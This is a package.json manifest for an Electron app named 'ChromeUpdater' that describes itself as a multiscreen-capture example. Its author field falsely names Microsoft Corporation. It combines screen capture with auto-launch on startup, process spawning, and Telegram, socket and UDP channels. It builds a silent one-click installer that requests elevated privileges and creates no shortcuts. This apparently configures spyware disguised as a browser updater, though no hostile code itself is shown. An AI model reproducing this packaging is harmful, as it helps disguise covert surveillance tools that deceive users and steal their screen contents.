{
  "name": "ChromeUpdater",
  "version": "10.1.7",
  "description": "This project contains example about multiscreen capture via electron-js",
  "main": "index.js",
  "scripts": {
    "start": "electron .",
    "build": "electron-builder --ia32"
  },
  "repository": {
    "type": "git",
    "url": "git+https://github.com/mhmttkmk0352/Multi-Screen-Capture-with-Electron-App.git"
  },
  "keywords": [],
  "author": "Microsoft Corporation",
  "license": "ISC",
  "bugs": {
    "url": "https://github.com/mhmttkmk0352/Multi-Screen-Capture-with-Electron-App/issues"
  },
  "homepage": "https://github.com/mhmttkmk0352/Multi-Screen-Capture-with-Electron-App#readme",
  "devDependencies": {
    "electron": "10.4.7",
    "electron-builder": "^24.4.0"
  },
  "dependencies": {
    "auto-launch": "^5.0.5",
    "child_process": "^1.0.2",
    "dgram": "^1.0.1",
    "node-telegram-bot-api": "^0.61.0",
    "os": "^0.1.2",
    "request": "^2.88.2",
    "socket.io-client": "^4.5.1"
  },
  "build": {
    "win": {
      "oneClick": true,
      "runAfterFinish": true,
      "target": [
        {
          "target": "nsis-web",
          "arch": [
            "ia32"
          ]
        }
      ],
      "requestedExecutionLevel": "highestAvailable"
    },
    "nsisWeb": {
      "createDesktopShortcut": false,
      "createStartMenuShortcut": false
    }
  },
  "asar": true
}
